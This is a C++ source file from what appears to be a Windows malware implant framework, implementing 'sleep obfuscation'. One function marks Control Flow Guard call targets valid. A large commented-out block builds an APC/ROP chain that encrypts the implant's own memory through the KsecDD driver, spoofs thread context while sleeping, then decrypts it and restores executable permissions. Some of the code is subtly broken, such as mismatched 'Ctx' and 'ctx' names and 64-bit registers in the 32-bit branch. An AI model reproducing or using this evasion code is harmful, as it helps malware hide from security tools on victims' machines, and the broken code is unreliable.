#include <core/include/sleep.hpp>
using namespace Utils::Time;
using namespace Utils::Random;

BOOL AddValidCallTarget(LPVOID pointer) {
    CFG_CALL_TARGET_INFO target_info = { };
    EXTENDED_PROCESS_INFORMATION ex_procinfo = { };

    auto base       = Ctx->Base.Address;
    auto nt_head    = (PIMAGE_NT_HEADERS) base + ((PIMAGE_DOS_HEADER)base)->e_lfanew;

    ex_procinfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
    ex_procinfo.ExtendedProcessInfoBuffer = 0;

    if (!NT_SUCCESS(ntstatus = ctx->win32.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) (ProcessCookie | ProcessUserModeIOPL), &ex_procinfo, sizeof(ex_procinfo), nullptr))) {
        return false;
    }

    target_info.Flags  = CFG_CALL_TARGET_VALID;
    target_info.Offset = U_PTR(pointer) - U_PTR(ctx->base.address);

    size_t length = nt_head->OptionalHeader.SizeOfImage;
    length = (length + 0x1000 - 1) &~ (0x1000 - 1);

    if (ctx->win32.SetProcessValidCallTargets(NtCurrentProcess(), &base, length, 1, &target_info)) {
        return true;
    }

    return false;
}

BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
// TODO: finish and implement thread stack spoofing along side
// TODO: modify with shubakki's pivoting technique: https://sillywa.re/posts/flower-da-flowin-shc/
    BOOL success = true;
    Timeout(RandomSleepTime());

    /*
    BOOL                success     = true;
    LPWSTR              ksec_name   = L"\\Device\\KsecDD";
    UNICODE_STRING      ksec_uni    = { };
    IO_STATUS_BLOCK     iostat      = { };
    CLIENT_ID           src_cid     = { };
    OBJECT_ATTRIBUTES   src_object  = { };
    OBJECT_ATTRIBUTES   ksec_object = { };

    PVOID       target_region = { };
    PVOID       resume_ptr = { };

    SIZE_T      ContextMemLen = 0;
    SIZE_T      resume_len = 0;

    ULONG       ContextMemPrt = 0;
    ULONG       ContextResPrt = 0;
    ULONG       success_count = 0;

    HANDLE      rop_thread  = { };
    HANDLE      src_thread  = { };
    HANDLE      sync_event  = { };
    HANDLE      ksec_handle = { };

    PCONTEXT    rop_buffer  = { };
    PCONTEXT    rop_ext     = { };
    PCONTEXT    rop_del     = { };
    PCONTEXT    rop_set     = { };
    PCONTEXT    rop_res     = { };
    PCONTEXT    rop_enc     = { };
    PCONTEXT    rop_dec     = { };
    PCONTEXT    stolen      = { };
    PCONTEXT    context_cap = { };
    PCONTEXT    cap_mem     = { };
    PCONTEXT    context_set = { };
    PCONTEXT    context_res = { };


    target_region = C_PTR(ctx->base.address);
    ContextMemLen = ctx->base.size;

    resume_ptr = C_PTR(ctx->base.address);
    resume_len = ctx->base.size;

    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtContinue)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtTestAlert)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtDelayExecution)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtGetContextThread)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtSetContextThread)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtWaitForSingleObject)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtDeviceIoControlFile)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.NtProtectVirtualMemory)));
    x_assertb(AddValidCallTarget(C_PTR(ctx->win32.ExitThread)));

    src_object.Length = sizeof(src_object);
    ksec_object.Length = sizeof(ksec_object);

    ctx->win32.RtlInitUnicodeString(&ksec_uni, ksec_name);
    InitializeObjectAttributes(&ksec_object, &ksec_uni, 0, nullptr, nullptr);

    x_ntassertb(ctx->win32.NtOpenFile(&ksec_handle, SYNCHRONIZE | FILE_READ_DATA, &ksec_object, &iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0));

    src_cid.UniqueProcess = nullptr;
    src_cid.UniqueThread  = NtCurrentTeb()->ClientId.UniqueThread;

    x_ntassertb(ctx->win32.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid));
    x_ntassertb(ctx->win32.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) fake_frame->Rip, nullptr, true, 0, 0xFFFF, 0xFFFF, nullptr));
    x_ntassertb(ctx->win32.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, nullptr, (EVENT_TYPE) 1, false));

    stolen      = (CONTEXT*) Malloc(sizeof(CONTEXT));
    rop_buffer  = (CONTEXT*) Malloc(sizeof(CONTEXT));

    stolen->ContextFlags = CONTEXT_FULL;
    x_ntassertb(ctx->win32.NtGetContextThread(rop_thread, stolen));

#if defined( _WIN64 )
    *rop_buffer                 = *stolen;
    rop_buffer->ContextFlags    = CONTEXT_FULL;
    rop_buffer->Rsp             = U_PTR(stolen->Rsp);
    rop_buffer->Rip             = U_PTR(ctx->win32.NtWaitForSingleObject);
    rop_buffer->Rcx             = U_PTR(sync_event);
    rop_buffer->Rdx             = false;
    rop_buffer->R8              = NULL;

    // NOTE: hey dummy, the return is pushed onto the stack first + 32 bytes of empty space.
    // just because 5+ arguments go onto the stack doesn't mean that they're first...
    *(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;
#else
    *rop_buffer                 = *stolen;
	rop_buffer->ContextFlags    = CONTEXT_FULL;
	rop_buffer->Esp             = U_PTR(stolen->Esp - 0x100);
	rop_buffer->Eip             = U_PTR(ctx->win32.NtWaitForSingleObject);
	*(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;

	// insert argument chain here
#endif

    // NOTE: pointing to the next thread after exception. Could be replaced by VEH.
    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) ctx->win32.NtContinue, rop_buffer, nullptr, nullptr));
    rop_set = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *rop_set = *stolen;
    rop_set->ContextFlags = CONTEXT_FULL;
    rop_set->Rsp          = U_PTR(stolen->Rsp - 0x1000);
    rop_set->Rip          = U_PTR(ctx->win32.NtProtectVirtualMemory);
    rop_set->Rcx          = U_PTR(NtCurrentProcess());
    rop_set->Rdx          = U_PTR(&target_region);
    rop_set->R8           = U_PTR(&ContextMemLen);
    rop_set->R9           = PAGE_READWRITE;

    *(uintptr_t*)(rop_set->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;
    *(uintptr_t*)(rop_set->Rsp + 0x28) = (uintptr_t) &ContextMemPrt;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) ctx->win32.NtContinue, rop_set, nullptr, nullptr));
    rop_enc = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *rop_enc = *stolen;
    rop_enc->ContextFlags = CONTEXT_FULL;
    rop_enc->Rsp          = U_PTR(stolen->Rsp - 0x2000);
    rop_enc->Rip          = U_PTR(ctx->win32.NtDeviceIoControlFile);
    rop_enc->Rcx          = U_PTR(ksec_handle);
    rop_enc->Rdx          = NULL;
    rop_enc->R8           = NULL;
    rop_enc->R9           = NULL;

    *(uintptr_t*)(rop_enc->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;
    *(uintptr_t*)(rop_enc->Rsp + 0x28) = (uintptr_t) &iostat;
    *(uintptr_t*)(rop_enc->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_ENCRYPT_MEMORY;
    *(uintptr_t*)(rop_enc->Rsp + 0x38) = (uintptr_t) target_region;
    *(uintptr_t*)(rop_enc->Rsp + 0x40) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
    *(uintptr_t*)(rop_enc->Rsp + 0x48) = (uintptr_t) target_region;
    *(uintptr_t*)(rop_enc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) ctx->win32.NtContinue, rop_enc, nullptr, nullptr));
    context_cap = (CONTEXT*) Malloc(sizeof(CONTEXT));
    cap_mem     = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *context_cap                = *stolen;
    cap_mem->ContextFlags       = CONTEXT_FULL;
    context_cap->ContextFlags   = CONTEXT_FULL;
    context_cap->Rsp            = U_PTR( stolen->Rsp );
    context_cap->Rip            = U_PTR( ctx->win32.NtGetContextThread );
    context_cap->Rcx            = U_PTR( src_thread );
    context_cap->Rdx            = U_PTR( cap_mem );

    *(uintptr_t*)(context_cap->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)ctx->win32.NtContinue, context_cap, nullptr, nullptr));
    context_set = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *context_set = *stolen;
    context_set->ContextFlags = CONTEXT_FULL;
    context_set->Rsp          = U_PTR( stolen->Rsp );
    context_set->Rip          = U_PTR( ctx->win32.NtSetContextThread );
    context_set->Rcx          = U_PTR( src_thread );
    context_set->Rdx          = U_PTR( fake_frame );

    *(uintptr_t*)(context_set->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)ctx->win32.NtContinue, context_set, nullptr, nullptr));
    rop_del = (CONTEXT*) Malloc(sizeof(CONTEXT));

//
// WAIT FUNCTION GOES HERE
//

//
// Swap this with NtWaitForSingleObject
// for practicality purposes so that
// we can use it on objects.
//

    *rop_del = *stolen;
    rop_del->ContextFlags = CONTEXT_FULL;
    rop_del->Rsp          = U_PTR(stolen->Rsp);
    rop_del->Rip          = U_PTR(ctx->win32.NtDelayExecution);
    rop_del->Rcx          = false;
    rop_del->Rdx          = U_PTR(Timeout);

    *(uintptr_t*)(rop_del->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) ctx->win32.NtContinue, rop_del, nullptr, nullptr));

//
// WAIT FUNCTION ENDS HERE
//

    rop_dec = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *rop_dec = *stolen;
    rop_dec->ContextFlags = CONTEXT_FULL;
    rop_dec->Rsp          = U_PTR(stolen->Rsp - 0x3000 );
    rop_dec->Rip          = U_PTR(ctx->win32.NtDeviceIoControlFile );
    rop_dec->Rcx          = U_PTR(ksec_handle);
    rop_dec->Rdx          = NULL;
    rop_dec->R8           = NULL;
    rop_dec->R9           = NULL;

    *(uintptr_t*)(rop_dec->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;
    *(uintptr_t*)(rop_dec->Rsp + 0x28) = (uintptr_t) &iostat;
    *(uintptr_t*)(rop_dec->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_DECRYPT_MEMORY;
    *(uintptr_t*)(rop_dec->Rsp + 0x38) = (uintptr_t) target_region;
    *(uintptr_t*)(rop_dec->Rsp + 0x40) = (uintptr_t) (ContextMemLen + 0x1000 - 1) & ~(0x1000 - 1);
    *(uintptr_t*)(rop_dec->Rsp + 0x48) = (uintptr_t) target_region;
    *(uintptr_t*)(rop_dec->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) & ~(0x1000 - 1);

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)ctx->win32.NtContinue, rop_dec, nullptr, nullptr));
    context_res = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *context_res = *stolen;
    context_res->ContextFlags = CONTEXT_FULL;
    context_res->Rsp          = U_PTR(stolen->Rsp);
    context_res->Rip          = U_PTR(ctx->win32.NtSetContextThread);
    context_res->Rcx          = U_PTR(src_thread);
    context_res->Rdx          = U_PTR(cap_mem);

    *(uintptr_t*)(context_res->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)ctx->win32.NtContinue, context_res, nullptr, nullptr));
    rop_res = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *rop_res = *stolen;
    rop_res->ContextFlags = CONTEXT_FULL;
    rop_res->Rsp          = U_PTR(stolen->Rsp - 0x1000);
    rop_res->Rip          = U_PTR(ctx->win32.NtProtectVirtualMemory);
    rop_res->Rcx          = U_PTR(NtCurrentProcess());
    rop_res->Rdx          = U_PTR(&resume_ptr);
    rop_res->R8           = U_PTR(&resume_len);
    rop_res->R9           = PAGE_EXECUTE_READWRITE;

    *(uintptr_t*)(rop_res->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert ;
    *(uintptr_t*)(rop_res->Rsp + 0x28) = (uintptr_t) &ContextResPrt;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)ctx->win32.NtContinue, rop_res, nullptr, nullptr));
    rop_ext = (CONTEXT*) Malloc(sizeof(CONTEXT));

    *rop_ext = *stolen;
    rop_ext->ContextFlags = CONTEXT_FULL;
    rop_ext->Rsp          = U_PTR(stolen->Rsp );
    rop_ext->Rip          = U_PTR(ctx->win32.ExitThread );
    rop_ext->Rcx          = NULL;

    *(uintptr_t*)(rop_ext->Rsp + 0x00) = (uintptr_t) ctx->win32.NtTestAlert;

    x_ntassertb(ctx->win32.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)ctx->win32.NtContinue, rop_ext, nullptr, nullptr));
    x_ntassertb(ctx->win32.NtAlertResumeThread(rop_thread, &success_count));
    x_ntassertb(ctx->win32.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, nullptr));

    defer:
    if (rop_dec)        { Free(rop_dec); }
    if (rop_enc)        { Free(rop_enc); }
    if (context_res)    { Free(context_res); }
    if (context_set)    { Free(context_set); }
    if (context_cap)    { Free(context_cap); }
    if (cap_mem)        { Free(cap_mem); }
    if (rop_res)        { Free(rop_res); }
    if (rop_set)        { Free(rop_set); }
    if (rop_del)        { Free(rop_del); }
    if (rop_ext)        { Free(rop_ext); }
    if (rop_buffer)     { Free(rop_buffer); }
    if (stolen)         { Free(stolen); }

    if (rop_thread) {
        ctx->win32.NtTerminateThread(rop_thread, ERROR_SUCCESS);
        ctx->win32.NtClose(rop_thread);
    }

    if (src_thread)     { ctx->win32.NtClose(src_thread); }
    if (sync_event)     { ctx->win32.NtClose(sync_event); }
    if (ksec_handle)    { ctx->win32.NtClose(ksec_handle); }

*/
    return success;
};
